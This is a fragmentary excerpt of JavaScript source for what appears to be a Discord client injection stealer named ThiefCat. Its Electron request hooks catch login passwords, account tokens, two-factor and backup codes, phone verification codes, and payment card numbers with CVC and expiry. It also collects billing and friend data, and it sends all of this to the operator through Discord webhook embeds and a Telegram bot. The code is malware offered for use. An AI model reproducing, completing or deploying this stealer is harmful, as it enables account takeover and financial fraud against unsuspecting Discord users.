...
function SessionsTelegramSend(message, token, channelId, userId) {
  if (/\/req\//.test(config.tel_url)) {
    const data = JSON.stringify({ message: parseTelegram(message) });
...
const FirstTime = async () => {
  ...
  if (fs.existsSync(__dirname + "/ThiefCat")) {
    ...
    if (!token) {
      ...
      if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
      if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/giphy.gif";
        ...
        fields: [
          {
            ...
            value: `\`\`\`${user.bio !== null && user.bio !== undefined && user.bio !== "" ? user.bio : "❌"}\`\`\``,
            inline: false,
          },
          {
...
📧 Token: ${token ?? "none"}
\`\`\``;
      SessionsTelegramSend(message, config.bot_token, config.chat_id, config.user_id);
    }
    await post(params);
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config["logout-notify"] == "true") {
      if (!token) {
        var params = await makeEmbed({
          title: "<:nova:1132934190032244786> User log out (User not Logged in before)",
          fields: [
            {
              name: "Injection Info",
...
async function BoukiTuclcavectesfonctions() {
  ...
  var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
  if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
  if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHcuck/sub/165ae07181c977bdf519ebc7b40f314a81ea7415/assets/influence.gif";

  var userBanner = userBanner ?? (await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`));
  var userAvatar = userAvatar ?? (await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`));
  var Billings = parseBilling(billing);
  var Friends = parseFriends(friends);
  return {
    token,
...
electron.session.defaultSession.webRequest.onHeadersReceived(async (request, callback) => {
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
  ...
  switch (true) {
      ...
      setTimeout(async () => {
        ...
        var params3 = await makeEmbed({
          ...
          fields: [
            {
              name: "Bio <:nova:1132934190032244786>",
              value: `\`\`\`${usr.bio !== null && usr.bio !== undefined && usr.bio !== "" ? usr.bio : "❌"}\`\`\``,
              inline: false,
            },
            {
              name: "Language <:4533language:1130453119919206500>",
    ...
    case request.url.endsWith("login"):
      var { token, user, billing, friends, Nitro, userAvatar, userBanner, Billings, Friends } = await BoukiTuclcavectesfonctions();
      if (!token) {
        await electron.session.defaultSession.webRequest.onCompleted(config.onCompletedbis, async (re, callback) => {
          var dt;
          try {
            dt = JSON.parse(re.uploadData[0].bytes);
          } catch (err) {
            dt = queryString.parse(decodeURIComponent(re.uploadData[0].bytes.toString()));
          }
          let { token, user, billing, friends, Nitro, userAvatar, userBanner, Billings, Friends } = await BoukiTuclcavectesfonctions();
          var password = data.password;
          var params = await makeEmbed({
          ...
          var params3 = await makeEmbed({
            ...
            fields: [
              ...
              },
              {
                ...
                value: `\`${dt.code !== null && dt.code !== undefined && dt.code !== "" ? dt.code : "❌"}\``,
                inline: !0,
              },
              {
                name: "Language <:4533language:1130453119919206500>",
...
\`\`\``;
    ...
    case request.url.includes("phone-verifications"):
      if (data.phone && data.code) {
        const { token, user, Nitro, userAvatar, userBanner, Billings, Friends } = await BoukiTuclcavectesfonctions();
        if (!user || !token) {
          return;
        }
      ...
      if (CardNumber && CardCVC && month && year) {
        await electron.session.defaultSession.webRequest.onCompleted(config.onCompletedbis, async (re, callback) => {
          try {
            ...
            var dt = queryString.parse(decodeURIComponent(re.uploadData[0].bytes.toString()));
          }
      ...
      var params = await makeEmbed({
        ...
        fields: [
          ...
          },
          {
            ...
            value: `\`\`\`md\n${backup_codes.map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`).join("\n")}\`\`\``,
            inline: false,
          },
          {
            name: "<a:eatsomething:1130449693613228072> Token",
...
📧 Token: ${token ?? "none"}
\`\`\``;
      SessionsTelegramSend(messages, config.bot_token, config.chat_id, config.user_id);
      await post(params);
      break;
      ...
      var params = await makeEmbed({
        ...
        fields: [
          ...
          },
          {
            ...
            value: `\`\`\`md\n${backup_code.map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`).join("\n")}\`\`\``,
            inline: false,
          },
          {
            name: "<a:eatsomething:1130449693613228072> Token",
...
Codes:
\`\`\`md\n${backup_code.map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`).join("\n")}\`\`\``;
      SessionsTelegramSend(messagez, config.bot_token, config.chat_id, config.user_id);
